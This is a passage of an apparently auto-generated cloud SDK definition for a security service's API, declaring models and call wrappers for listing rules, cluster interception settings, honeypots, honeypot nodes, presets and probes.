  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckStandard',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCheckStandard(request: ListCheckStandardRequest): ListCheckStandardResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckStandardWithOptions(request, runtime);
}

model ListClientUserDefineRuleTypesResponseBody = {
  requestId?: string(name='RequestId', example='340D7FC4-D575-1661-8ACD-CFA7BE57****'),
  userDefineRuleTypes?: [ string ](name='UserDefineRuleTypes'),
}

model ListClientUserDefineRuleTypesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClientUserDefineRuleTypesResponseBody(name='body'),
}

async function listClientUserDefineRuleTypesWithOptions(runtime: Util.RuntimeOptions): ListClientUserDefineRuleTypesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListClientUserDefineRuleTypes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listClientUserDefineRuleTypes(): ListClientUserDefineRuleTypesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClientUserDefineRuleTypesWithOptions(runtime);
}

model ListClientUserDefineRulesRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  name?: string(name='Name'),
  pageSize?: int32(name='PageSize', example='10'),
  type?: [ int32 ](name='Type'),
}

model ListClientUserDefineRulesResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='69'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393***'),
  userDefineRuleList?: [ 
    {
      actionType?: int32(name='ActionType', example='0'),
      id?: long(name='Id', example='200****'),
      name?: string(name='Name'),
      platform?: string(name='Platform', example='linux'),
      switchId?: string(name='SwitchId', example='USER-DEFINE-RULE-SWITCH-TYPE_200****'),
      type?: int32(name='Type', example='1'),
    }
  ](name='UserDefineRuleList'),
}

model ListClientUserDefineRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClientUserDefineRulesResponseBody(name='body'),
}

async function listClientUserDefineRulesWithOptions(request: ListClientUserDefineRulesRequest, runtime: Util.RuntimeOptions): ListClientUserDefineRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListClientUserDefineRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listClientUserDefineRules(request: ListClientUserDefineRulesRequest): ListClientUserDefineRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClientUserDefineRulesWithOptions(request, runtime);
}

model ListClusterCnnfStatusDetailRequest {
  clusterIds?: [ string ](name='ClusterIds'),
}

model ListClusterCnnfStatusDetailResponseBody = {
  data?: [ 
    {
      clusterId?: string(name='ClusterId', example='c8ca91e0907d94efaba7fb0827eb9****'),
      installed?: boolean(name='Installed', example='true'),
      instanceId?: string(name='InstanceId', example='i-bp180bogui4fc0z4****'),
      internetIp?: string(name='InternetIp', example='172.16.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='10.42.XX.XX'),
      invalidType?: string(name='InvalidType', example='PLUGIN_OFFLINE'),
      machineName?: string(name='MachineName', example='security'),
      machineType?: int32(name='MachineType', example='ecs'),
      pluginName?: string(name='PluginName', example='alinet'),
      pluginVersion?: string(name='PluginVersion', example='3.3'),
      status?: string(name='Status', example='false'),
      uuid?: string(name='Uuid', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    }
  ](name='Data'),
  requestId?: string(name='RequestId', example='64329F40-5C94-51D3-A400-37AA7BAC****'),
}

model ListClusterCnnfStatusDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClusterCnnfStatusDetailResponseBody(name='body'),
}

async function listClusterCnnfStatusDetailWithOptions(request: ListClusterCnnfStatusDetailRequest, runtime: Util.RuntimeOptions): ListClusterCnnfStatusDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterIds)) {
    query['ClusterIds'] = request.clusterIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListClusterCnnfStatusDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listClusterCnnfStatusDetail(request: ListClusterCnnfStatusDetailRequest): ListClusterCnnfStatusDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClusterCnnfStatusDetailWithOptions(request, runtime);
}

model ListClusterInterceptionConfigRequest {
  clusterCNNFStatus?: int32(name='ClusterCNNFStatus'),
  clusterId?: string(name='ClusterId'),
  clusterName?: string(name='ClusterName'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
}

model ListClusterInterceptionConfigResponseBody = {
  clusterConfigList?: [ 
    {
      clusterCNNFStatus?: int32(name='ClusterCNNFStatus'),
      clusterId?: string(name='ClusterId'),
      clusterName?: string(name='ClusterName'),
      clusterType?: string(name='ClusterType'),
      interceptionSwitch?: int32(name='InterceptionSwitch'),
      openRuleCount?: long(name='OpenRuleCount'),
      supportCNNF?: boolean(name='SupportCNNF'),
      totalRuleCount?: long(name='TotalRuleCount'),
    }
  ](name='ClusterConfigList'),
  pageInfo?: {
    count?: int32(name='Count'),
    currrentPage?: int32(name='CurrrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model ListClusterInterceptionConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClusterInterceptionConfigResponseBody(name='body'),
}

async function listClusterInterceptionConfigWithOptions(request: ListClusterInterceptionConfigRequest, runtime: Util.RuntimeOptions): ListClusterInterceptionConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterCNNFStatus)) {
    query['ClusterCNNFStatus'] = request.clusterCNNFStatus;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListClusterInterceptionConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listClusterInterceptionConfig(request: ListClusterInterceptionConfigRequest): ListClusterInterceptionConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClusterInterceptionConfigWithOptions(request, runtime);
}

model ListHoneypotRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  honeypotIds?: [ string ](name='HoneypotIds', description='The IDs of honeypots.'),
  honeypotName?: string(name='HoneypotName', description='The name of the honeypot.', example='mx-rouyi'),
  nodeId?: string(name='NodeId', description='The ID of the management node to which the honeypot belongs.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
  nodeName?: string(name='NodeName', description='The name of the management node to which the honeypot belongs.', example='honeypot_master'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
}

model ListHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  list?: [ 
    {
      controlNodeName?: string(name='ControlNodeName', description='The name of the management node to which the honeypot is deployed.', example='0804-pre'),
      honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='76c2a1c72ef259777d96d55a7834e5f5d98f85666c49f76ad9caa447d8b7****'),
      honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the image that is used for the honeypot.', example='MongoDB'),
      honeypotImageId?: string(name='HoneypotImageId', description='The ID of the image that is used for the honeypot.', example='sha256:eca5ced3757e46c24701e9ced4e652f2d730262d5685a4e001da22c4fb418fd4'),
      honeypotImageName?: string(name='HoneypotImageName', description='The name of the image that is used for the honeypot.', example='tcp_proxy'),
      honeypotName?: string(name='HoneypotName', description='The name of the honeypot.', example='mx-rouyi'),
      nodeId?: string(name='NodeId', description='The ID of the management node.', example='c94eff5b-ea48-4805-8b7f-e04d3509b117'),
      presetId?: string(name='PresetId', description='The ID of the custom configuration for the honeypot.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
      state?: [ string ](name='State', description='An array that consists of the status information of the honeypot.'),
    }
  ](name='List'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C80AFF1F-CC20-502C-A4D4-F5433E529B69'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotResponseBody(name='body'),
}

async function listHoneypotWithOptions(request: ListHoneypotRequest, runtime: Util.RuntimeOptions): ListHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.honeypotIds)) {
    query['HoneypotIds'] = request.honeypotIds;
  }
  if (!Util.isUnset(request.honeypotName)) {
    query['HoneypotName'] = request.honeypotName;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listHoneypot(request: ListHoneypotRequest): ListHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotWithOptions(request, runtime);
}

model ListHoneypotAlarmEventsRequest {
  currentPage?: int32(name='CurrentPage'),
  dealed?: string(name='Dealed'),
  dstIp?: string(name='DstIp'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  riskLevelList?: [ string ](name='RiskLevelList'),
  srcIp?: string(name='SrcIp'),
}

model ListHoneypotAlarmEventsResponseBody = {
  honeypotAlarmEvents?: [ 
    {
      alarmEventId?: long(name='AlarmEventId'),
      alarmEventName?: string(name='AlarmEventName'),
      alarmEventType?: string(name='AlarmEventType'),
      alarmUniqueInfo?: string(name='AlarmUniqueInfo'),
      eventCount?: int32(name='EventCount'),
      firstTime?: long(name='FirstTime'),
      lastTime?: long(name='LastTime'),
      mergeFieldList?: [ 
        {
          fieldExtInfo?: string(name='FieldExtInfo'),
          fieldKey?: string(name='FieldKey'),
          fieldType?: string(name='FieldType'),
          fieldValue?: string(name='FieldValue'),
        }
      ](name='MergeFieldList'),
      operateStatus?: int32(name='OperateStatus'),
      riskLevel?: string(name='RiskLevel'),
    }
  ](name='HoneypotAlarmEvents'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model ListHoneypotAlarmEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotAlarmEventsResponseBody(name='body'),
}

async function listHoneypotAlarmEventsWithOptions(request: ListHoneypotAlarmEventsRequest, runtime: Util.RuntimeOptions): ListHoneypotAlarmEventsResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotAlarmEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listHoneypotAlarmEvents(request: ListHoneypotAlarmEventsRequest): ListHoneypotAlarmEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotAlarmEventsWithOptions(request, runtime);
}

model ListHoneypotNodeRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  nodeId?: string(name='NodeId', description='The ID of the management node.', example='7d110ca6-05ee-4149-8042-13ad1a41fd****'),
  nodeName?: string(name='NodeName', description='The name of the management node.', example='cyct_cnymu'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
}

model ListHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotNodeList?: [ 
    {
      allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet', description='Indicates whether the honeypot is allowed to access the Internet.

*   **true**: The honeypot is allowed to access the Internet.
*   **false**: The honeypot is not allowed to access the Internet.', example='true'),
      createTime?: string(name='CreateTime', description='The time when the management node was created.', example='2022-08-04 15:52:56'),
      defaultNode?: boolean(name='DefaultNode', description='The type of the management node. Default value: **false**. Valid values:

*   **false**: non-default type
*   **true**: default type', example='false'),
      ecsInstanceId?: string(name='EcsInstanceId', description='The ID of the Elastic Compute Service (ECS) instance.', example='i-bp1fs3qsc1msa3512k****'),
      honeypotTotalCount?: int32(name='HoneypotTotalCount', description='The maximum number of honeypots that can be deployed on the management node.', example='10'),
      honeypotUsedCount?: int32(name='HoneypotUsedCount', description='The number of honeypots that are deployed on the management node.', example='2'),
      nodeId?: string(name='NodeId', description='The ID of the management node.', example='7d110ca6-05ee-4149-8042-13ad1a41fd****'),
      nodeIp?: string(name='NodeIp', description='The IP address of the management node.', example='119.180.XX.XX'),
      nodeName?: string(name='NodeName', description='The name of the management node.', example='cyct_cnymu'),
      probeTotalCount?: int32(name='ProbeTotalCount', description='The maximum number of probes that can be used.', example='5'),
      probeUsedCount?: int32(name='ProbeUsedCount', description='The number of probes that are used.', example='2'),
      securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList', description='An array that consists of the allowed CIDR blocks.'),
      totalStatus?: int32(name='TotalStatus', description='The status of the management node. Valid values:

*   **1**: normal
*   **2**: abnormal', example='1'),
      upgradeAvailable?: boolean(name='UpgradeAvailable'),
    }
  ](name='HoneypotNodeList', description='An array that consists of the information about the management nodes.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='337BEA70-B03D-5370-8420-436F3FCD9924'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotNodeResponseBody(name='body'),
}

async function listHoneypotNodeWithOptions(request: ListHoneypotNodeRequest, runtime: Util.RuntimeOptions): ListHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listHoneypotNode(request: ListHoneypotNodeRequest): ListHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotNodeWithOptions(request, runtime);
}

model ListHoneypotPresetRequest {
  currentPage?: int32(name='CurrentPage'),
  honeypotImageName?: string(name='HoneypotImageName', example='ruoyi'),
  lang?: string(name='Lang'),
  nodeId?: string(name='NodeId', example='d892b4fe-af0d-4486-ab2a-8a5180453c03'),
  nodeName?: string(name='NodeName'),
  pageSize?: int32(name='PageSize'),
  presetName?: string(name='PresetName', example='mx-rouyi'),
}

model ListHoneypotPresetResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  list?: [ 
    {
      controlNodeName?: string(name='ControlNodeName'),
      honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', example='Metabase'),
      honeypotImageName?: string(name='HoneypotImageName', example='metabase'),
      honeypotPresetId?: string(name='HoneypotPresetId', example='3cc04a47-7229-418c-8101-f10a2887c90b'),
      nodeId?: string(name='NodeId', example='c94eff5b-ea48-4805-8b7f-e04d3509b117'),
      presetName?: string(name='PresetName', example='WebMin-online'),
      presetType?: string(name='PresetType', example='CUSTOM'),
    }
  ](name='List'),
  message?: string(name='Message'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model ListHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotPresetResponseBody(name='body'),
}

async function listHoneypotPresetWithOptions(request: ListHoneypotPresetRequest, runtime: Util.RuntimeOptions): ListHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.presetName)) {
    query['PresetName'] = request.presetName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listHoneypotPreset(request: ListHoneypotPresetRequest): ListHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotPresetWithOptions(request, runtime);
}

model ListHoneypotProbeRequest {
  currentPage?: int32(name='CurrentPage'),
  displayName?: string(name='DisplayName', example='probe-test'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  probeStatus?: string(name='ProbeStatus', example='online'),
  probeType?: string(name='ProbeType', example='host_probe'),
}

model ListHoneypotProbeResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  list?: [ 
    {
      controlNode?: {
        ecsInstanceId?: string(name='EcsInstanceId', example='i-uf6eq0rlvu1mkh0pewek'),
        nodeId?: string(name='NodeId', example='8ec9da17-c0e7-4642-aad6-defc97226bfd'),
        nodeName?: string(name='NodeName'),
      }(name='ControlNode'),
      deployTime?: long(name='DeployTime', example='1669363825000'),
      displayName?: string(name='DisplayName', example='prod-pinpoint-hd1b'),
      hostIp?: string(name='HostIp', example='33.53.195.120'),
      osType?: string(name='OsType', example='windows'),
      probeId?: string(name='ProbeId', example='4d167bb3-dd09-4a6a-a179-d5d6a5b0afcf'),
      probeType?: string(name='ProbeType', example='host_probe'),
      probeVersion?: string(name='ProbeVersion', example='18060096'),
      status?: string(name='Status', example='unnormal'),
      uuid?: string(name='Uuid', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
      vpcId?: string(name='VpcId', example='vpc-5gu8iu68w9b472jbb2mlw'),
    }
  ](name='List'),
  message?: string(name='Message'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model ListHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotProbeResponseBody(name='body'),
}

async function listHoneypotProbeWithOptions(request: ListHoneypotProbeRequest, runtime: Util.RuntimeOptions): ListHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.displayName)) {
    query['DisplayName'] = request.displayName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.probeStatus)) {
    query['ProbeStatus'] = request.probeStatus;
  }
  if (!Util.isUnset(request.probeType)) {
    query['ProbeType'] = request.probeType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listHoneypotProbe(request: ListHoneypotProbeRequest): ListHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotProbeWithOptions(request, runtime);
}

model ListInterceptionImageResponseBody = {
  imageList?: [ 
    {
      imageName?: string(name='ImageName', example='opa-test:nu****'),
      imageUuid?: string(name='ImageUuid', example='1db2a71aa0f7afad1c2f59e4840c****'),
    }
  ](name='ImageList'),
  requestId?: string(name='RequestId', example='1A975D03-5F49-5354-B2CB-3918D5DA****'),
}

model ListInterceptionImageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInterceptionImageResponseBody(name='body'),
}

async function listInterceptionImageWithOptions(runtime: Util.RuntimeOptions): ListInterceptionImageResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListInterceptionImage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listInterceptionImage(): ListInterceptionImageResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInterceptionImageWithOptions(runtime);
}

model ListInterceptionRulePageRequest {
  clusterId?: string(name='ClusterId', example='cc41de13ab5474210bc0ce772a009****'),
  criteria?: string(name='Criteria', example='80'),
  criteriaType?: string(name='CriteriaType', example='DST_PORT'),
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='50'),
}

model ListInterceptionRulePageResponseBody = {
  interceptionRuleList?: [ 
    {
      dstTarget?: {
        appName?: string(name='AppName', example='console'),
        imageList?: [ string ](name='ImageList'),
        namespace?: string(name='Namespace', example='test'),
        ports?: [ string ](name='Ports'),
        ruleType?: string(name='RuleType', example='customize'),
        tagList?: [ string ](name='TagList'),
        targetId?: int32(name='TargetId', example='302001'),
        targetName?: string(name='TargetName', example='demo4****'),
        targetType?: string(name='TargetType', example='IMAGE'),
      }(name='DstTarget'),
      interceptType?: long(name='InterceptType', example='1'),
      orderIndex?: long(name='OrderIndex', example='1'),
      ruleId?: long(name='RuleId', example='30****'),
      ruleName?: string(name='RuleName', example='test'),
      ruleSwitch?: int32(name='RuleSwitch', example='1'),
      ruleType?: string(name='RuleType', example='customize'),
      srcTarget?: {
        appName?: string(name='AppName', example='ack-jenkins-lawr****'),
        imageList?: [ string ](name='ImageList'),
        namespace?: string(name='Namespace', example='jenkins'),
        ruleType?: string(name='RuleType', example='customize'),
        tagList?: [ string ](name='TagList'),
        targetId?: int32(name='TargetId', example='40****'),
        targetName?: string(name='TargetName', example='mhh-te****'),
        targetType?: string(name='TargetType', example='containerId'),
      }(name='SrcTarget'),
    }
  ](name='InterceptionRuleList'),
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='19'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='2'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='ACF97412-FD09-4D1F-994F-34DF12BR****'),
}

model ListInterceptionRulePageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInterceptionRulePageResponseBody(name='body'),
}

async function listInterceptionRulePageWithOptions(request: ListInterceptionRulePageRequest, runtime: Util.RuntimeOptions): ListInterceptionRulePageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListInterceptionRulePage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listInterceptionRulePage(request: ListInterceptionRulePageRequest): ListInterceptionRulePageResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInterceptionRulePageWithOptions(request, runtime);
}

model ListPluginForUuidRequest {
  types?: [ string ](name='Types'),
  uuid?: string(name='Uuid', example='bdb7071f-129d-4ceb-af80-4cf70c4571c6'),
}

model ListPluginForUuidShrinkRequest {
  typesShrink?: string(name='Types'),
  uuid?: string(name='Uuid', example='bdb7071f-129d-4ceb-af80-4cf70c4571c6'),
}

model ListPluginForUuidResponseBody = {
  aegisUuidTargetPluginConfigList?: [ 
    {
      aegisSuspiciousConfigList?: [ 
        {
          config?: boolean(name='Config', example='true'),
          msg?: string(name='Msg', example='authorized'),
          overallConfig?: boolean(name='OverallConfig', example='true'),
          type?: string(name='Type', example='alisecguard'),
        }
      ](name='AegisSuspiciousConfigList'),
      pluginInstallCode?: string(name='PluginInstallCode', example='k5O5nd'),
      pluginName?: string(name='PluginName', example='alisecguard'),
      pluginOnlineInstalled?: boolean(name='PluginOnlineInstalled', example='true'),
      pluginOnlineStatus?: boolean(name='PluginOnlineStatus', example='true'),
      pluginVersion?: string(name='PluginVersion', example='00_10'),
    }
  ](name='AegisUuidTargetPluginConfigList'),
  code?: int32(name='Code', example='200'),
